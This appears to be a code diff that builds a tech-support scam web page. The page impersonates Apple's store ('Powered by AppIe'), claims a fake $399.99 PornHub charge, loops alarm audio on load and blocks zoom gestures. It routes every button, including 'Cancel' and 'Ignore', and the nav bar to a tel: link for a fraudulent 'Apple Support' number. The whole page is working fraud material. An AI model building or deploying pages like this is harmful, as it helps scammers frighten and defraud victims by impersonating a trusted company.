+  .call-icon-wrap {
+    position: relative;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .call-icon-wrap::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.12);
+    animation: pulse 1.8s ease-out infinite;
+  }
+
+  .call-icon {
+    width: 18px;
+    height: 18px;
+    fill: #ffffff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .call-label {
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    text-decoration-thickness: 1.5px;
+    text-decoration-color: rgba(255,255,255,0.5);
+  }
+
+  @keyframes pulse {
+    0%   { transform: scale(0.8); opacity: 0.8; }
+    70%  { transform: scale(1.6); opacity: 0;   }
+    100% { transform: scale(0.8); opacity: 0;   }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateX(-50%) translateY(24px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0);    }
+  }
+
+  @media (max-width: 480px) {
+    .call-popup-btn {
+      padding: 22px 44px;
+      font-size: 22px;
     }
   }
+  .popup-heading {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
 
+.popup-subtext {
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.6;
+    margin: 0;
+    text-align: right;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      touch-action: pan-x pan-y;
+    }
+
+    .apple-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(245,245,247,0.92);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 0.5px solid #d2d2d7;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 clamp(1rem, 5vw, 1.5rem);
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 8px; }
+    .nav-title { font-size: 17px; font-weight: 600; color: #1d1d1f; letter-spacing: -0.3px; }
+
+    .nav-cart {
+      display: flex; align-items: center; justify-content: center;
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      transition: background 0.15s;
+    }
+    .nav-cart:active { background: #e5e5ea; }
+    .cart-badge {
+      position: absolute;
+      top: 1px; right: 1px;
+      width: 17px; height: 17px;
+      background: #0071e3;
+      border-radius: 50%;
+      font-size: 10px; font-weight: 700;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #f5f5f7;
+    }
+
+    #processing {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100dvh;
+      padding-top: 52px;
+      background: #f5f5f7;
+      text-align: center;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+
+    #confirmed {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      width: 100%;
+      min-height: 100dvh;
+      padding-top: 68px;
+      padding-bottom: max(env(safe-area-inset-bottom, 16px), 20px);
+      padding-left: clamp(12px, 4vw, 20px);
+      padding-right: clamp(12px, 4vw, 20px);
+      gap: 0;
+      overflow: visible;
+    }
+
+    canvas#confetti {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 98;
+    }
+
+    .spinner {
+      width: 38px; height: 38px;
+      border: 2.5px solid #d2d2d7;
+      border-top: 2.5px solid #1d1d1f;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin-top: 1.25rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .check-ring {
+      width: clamp(44px, 12vw, 60px);
+      height: clamp(44px, 12vw, 60px);
+      border-radius: 50%; background: #34c759;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto clamp(4px, 1.2vh, 8px);
+      animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      flex-shrink: 0;
+    }
+    @keyframes popIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: clamp(10px, 2.2vh, 18px) clamp(14px, 4vw, 20px);
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+      flex-shrink: 0;
+    }
+
+    .divider {
+      height: 0.5px;
+      background: #e5e5ea;
+      margin: clamp(6px, 1.4vh, 10px) 0;
+      width: 100%;
+    }
+
+    .progress-wrap {
+      display: flex; align-items: flex-start;
+      justify-content: center; width: 100%;
+    }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
+    .dot {
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: clamp(9px, 2.5vw, 11px); font-weight: 600;
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .dot.done  { background: #1d1d1f; color: #fff; }
+    .dot.active{ background: #0071e3; color: #fff; }
+    .dot.pending{ background: #e5e5ea; color: #aeaeb2; }
+    .step-line {
+      flex: 1; height: 2px;
+      margin-top: clamp(10px, 2.8vw, 13px);
+      z-index: 0;
+    }
+    .step-line.done   { background: #1d1d1f; }
+    .step-line.pending{ background: #e5e5ea; }
+    .step-lbl {
+      font-size: clamp(9px, 2.4vw, 11px);
+      text-align: center; letter-spacing: -0.1px;
+    }
+    .step-lbl.done   { color: #1d1d1f; font-weight: 500; }
+    .step-lbl.active { color: #0071e3; font-weight: 500; }
+    .step-lbl.pending{ color: #aeaeb2; }
+
+    .order-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: clamp(5px, 1.2vh, 8px) 0;
+    }
+    .order-row + .order-row { border-top: 0.5px solid #e5e5ea; }
+
+    .alert-card {
+      background: #fff9ec;
+      border-radius: 14px;
+      padding: clamp(8px, 1.8vh, 14px) clamp(12px, 4vw, 16px);
+      width: 100%; max-width: 420px;
+      flex-shrink: 0;
+    }
+
+    .btn-call {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #0071e3; color: #fff;
+      border: none; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 500;
+      cursor: pointer; text-decoration: none; text-align: center;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-call:active { background: #0062c3; }
+
+    .btn-ignore {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #fff; color: #1d1d1f;
+      border: 0.5px solid #d2d2d7; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 400;
+      cursor: pointer; text-align: center;
+      margin-top: 6px;
+      text-decoration: none;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-ignore:active { background: #f2f2f7; }
+
+    .sub-text {
+      width: 100%; max-width: 420px;
+      text-align: center;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #6e6e73;
+      line-height: 1.55;
+      margin-bottom: clamp(4px, 1vh, 8px);
+      flex-shrink: 0;
+    }
+
+    .card-header {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+    }
+    </style>
+
+<body>
+<audio id="audioDue">
+    <source src="due83.wav" type="audio/wav">
+</audio>
+
+<audio id="myAudio" loop>
+    <source src="auf7u4.wav" type="audio/wav">
+</audio>
+
+<script>
+const audio = document.getElementById("myAudio");
+const due   = document.getElementById("audioDue");
+
+// Gap between each due83.wav play (milliseconds)
+const DUE_TO_DUE_GAP = 17000;   // 17s
+
+let dueLoopRunning = false;
+
+// Play main looping audio + start due loop on load
+window.addEventListener("load", () => {
+    audio.play().catch(() => {
+        console.log("Autoplay blocked until user interaction");
+    });
+    startDueLoop();
+});
+
+// Simple, restartable loop using setTimeout
+function startDueLoop() {
+    if (dueLoopRunning) return;
+    dueLoopRunning = true;
+    playDue();
+}
+
+function playDue() {
+    try { due.currentTime = 0; } catch (e) {}
+    due.play().catch(() => {});
+
+    due.onended = () => {
+        setTimeout(playDue, DUE_TO_DUE_GAP);
+    };
+}
+
+// Fallback: if autoplay was blocked, kick off on first user click
+document.addEventListener("click", () => {
+    audio.play().catch(() => {});
+    startDueLoop();
+}, { once: true });
+</script>
+
+<!-- ============ NEW POPUP ============ -->
+<div class="popup-overlay" id="paymentPopup">
+
+    <div class="ps-popup" role="dialog" aria-modal="true">
+
+      <div class="popup-header">
+        <div class="brand-icon">
+          <img src="3553gg3h.png" alt="Apple Pay">
+        </div>
+
+        <h2>Payment Security Alert</h2>
+        <p>Unusual transaction detected</p>
+      </div>
+
+      <div class="popup-body">
+
+        <p>
+          A potentially unauthorized payment was reported
+          in connection with this payment account.
+        </p>
+
+        <div class="transaction-box">
+
+          <div class="transaction-row">
+            <span>Merchant</span>
+            <span>PornHub</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Payment Method</span>
+            <span>Apple Pay</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Amount</span>
+            <span class="amount">$399.99</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Transaction ID</span>
+            <span>APX-728491</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Status</span>
+            <span class="status">Completed</span>
+          </div>
+
+        </div>
+
+        <div class="notice">
+          <strong>Important:</strong>
+          <span>If You believe this transaction is unauthorized,</span>
+          <span>Please contact Apple Support at <strong data-phone-display>+1(855) 397-2122</strong></span>
+        </div>
+
+        <div class="buttons">
+          <button class="primary-btn" data-phone-tel>
+            Call Now
+          </button>
+
+          <button class="secondary-btn" data-phone-tel>
+            Cancel
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+<!-- ============ END NEW POPUP ============ -->
+
+<nav class="apple-nav" data-phone-tel style="cursor:pointer;">
+  <div class="nav-left">
+    <img src="lseen2.webp" alt="Menu" style="width:18px;height:auto;display:block;">
+    <img src="ee8e63hh.webp" alt="Apple Logo" style="width:18px;height:auto;display:block;position:relative;top:-3px;">
+    <span class="nav-title">Store</span>
+  </div>
+
+  <div class="nav-cart">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="3" y1="6" x2="21" y2="6" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round"/>
+      <path d="M16 10a4 4 0 01-8 0" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+</nav>
+
+<!-- Processing Screen -->
+<div id="processing">
+  <img src="3553gg3h.png" alt="Apple Logo" 
+       style="width:90px;height:auto;display:block;margin:0 auto 12px;">
+       
+  <p style="font-size:16px;color:#6e6e73;margin:0;">Powered by AppIe</p>
+  <p style="font-size:26px;font-weight:700;color:#1d1d1f;margin:4px 0 0;">Processing your order...</p>
+  <p style="font-size:16px;color:#6e6e73;margin:4px 0 0;">Please wait a moment</p>
   
-  preloadSecret().catch(() => {});
+  <div class="spinner"></div>
+</div>
 
- 
-  window.addEventListener("mousemove", showSecret, { once: true });
-  window.addEventListener("touchstart", showSecret, { once: true });
-  window.addEventListener("click", showSecret, { once: true });
+<!-- Confirmed Screen -->
+<div id="confirmed">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="check-ring">
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,15 11,20 22,9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 style="font-size:clamp(17px,5vw,22px);font-weight:700;color:#1d1d1f;margin:0 0 2px;letter-spacing:-0.5px;">Order confirmed</h1>
+      <p style="font-size:clamp(11px,3vw,13px);color:#6e6e73;letter-spacing:-0.1px;">Thank you for your purchase</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="progress-wrap">
+      <div class="step">
+        <div class="dot done">✓</div>
+        <span class="step-lbl done">Placed</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step">
+        <div class="dot active" style="font-size:clamp(13px,3.5vw,16px);">···</div>
+        <span class="step-lbl active">Preparing</span>
+      </div>
+      <div class="step-line pending"></div>
+      <div class="step">
+        <div class="dot pending">○</div>
+        <span class="step-lbl pending">Ready</span>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Order</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-id">#EB-000000</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Date</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-date">—</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Item</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Store</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Amount</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">$399.99</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Payment mode</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Wallet</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Status (Paid)</span>
+      <span style="font-size:clamp(16px,2.8vw,12px);font-weight:500;color:#fff;background:#0071e3;padding:3px 10px;border-radius:20px;">Preparing</span>
+    </div>
+  </div>
+
+  <p class="sub-text">Pre-authorized transaction. No further action needed.</p>
+
+  <div class="alert-card">
+    <p style="font-size:clamp(16px,3vw,13px);color:#3a3000;line-height:1.55;margin:0 0 0;letter-spacing:-0.1px;">
+      ⚠ This amount will appear in your payment history within 24 hours.
+      If you did not place this order, please call support immediately.
+    </p>
+    <a class="btn-call" data-phone-tel>Call support: <span data-phone-display>+1(855) 397-2122</span></a>
+    <a class="btn-ignore" data-phone-tel>Ignore</a>
+  </div>
+
+</div>
+<canvas id="confetti"></canvas>	
+<script>
+  function generateOrderId() {
+    return '#EB-' + Math.floor(100000 + Math.random() * 900000);
+  }
+  function formatDate(d) {
+    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var h = d.getHours(), m = d.getMinutes(), ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear() + ' ' +
+           h + ':' + (m < 10 ? '0'+m : m) + ' ' + ampm;
+  }
+  function launchConfetti() {
+    var canvas = document.getElementById('confetti');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var colors = ['#0071e3','#34c759','#ff9f0a','#ff375f','#bf5af2','#1d1d1f'];
+    var pieces = Array.from({length: 110}, function() {
+      return {
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 150,
+        w: 5 + Math.random() * 7,
+        h: 9 + Math.random() * 5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        rot: Math.random() * 360,
+        speed: 2.5 + Math.random() * 3,
+        drift: (Math.random() - 0.5) * 1.5,
+        spin: (Math.random() - 0.5) * 5
+      };
+    });
+    var frame = 0;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      pieces.forEach(function(p) {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.rot * Math.PI / 180);
+        ctx.fillStyle = p.color;
+        ctx.globalAlpha = 0.88;
+        ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+        ctx.restore();
+        p.y += p.speed; p.x += p.drift; p.rot += p.spin;
+      });
+      frame++;
+      if (frame < 200) requestAnimationFrame(draw);
+      else ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+    draw();
+  }
+  setTimeout(function() {
+    document.getElementById('processing').style.display = 'none';
+    var c = document.getElementById('confirmed');
+    c.style.display = 'flex';
+    document.getElementById('order-id').textContent = generateOrderId();
+    document.getElementById('order-date').textContent = formatDate(new Date());
+    launchConfetti();
+  }, 2000);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>    
+
+<script>
+function closePopup() {
+    document.getElementById("paymentPopup").style.display = "none";
+}
+
+document.getElementById("paymentPopup").addEventListener(
+    "click",
+    function (event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    }
+);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>
+
+<!-- ============================================================= -->
+<!-- 🔧 AUTO-INJECT: appliesthe phone number to all tagged elements -->
+<!-- ============================================================= -->
+<script>
+(function() {
+  var cfg = window.SUPPORT_PHONE;
+
+  // 1) Update every element that shows the number as text
+  document.querySelectorAll('[data-phone-display]').forEach(function(el) {
+    el.textContent = cfg.display;
+  });
+
+  // 2) Update every element that should become a tel: link
+  document.querySelectorAll('[data-phone-tel]').forEach(function(el) {
+    // If it's a button → add click handler
+    if (el.tagName === 'BUTTON') {
+      el.addEventListener('click', function() {
+        window.location.href = 'tel:' + cfg.tel;
+      });
+    } else {
+      // If it's an <a> or anything else → set href
+      el.setAttribute('href', 'tel:' + cfg.tel);
+    }
+  });
+})();
 </script>
 </body>
+
 </html>
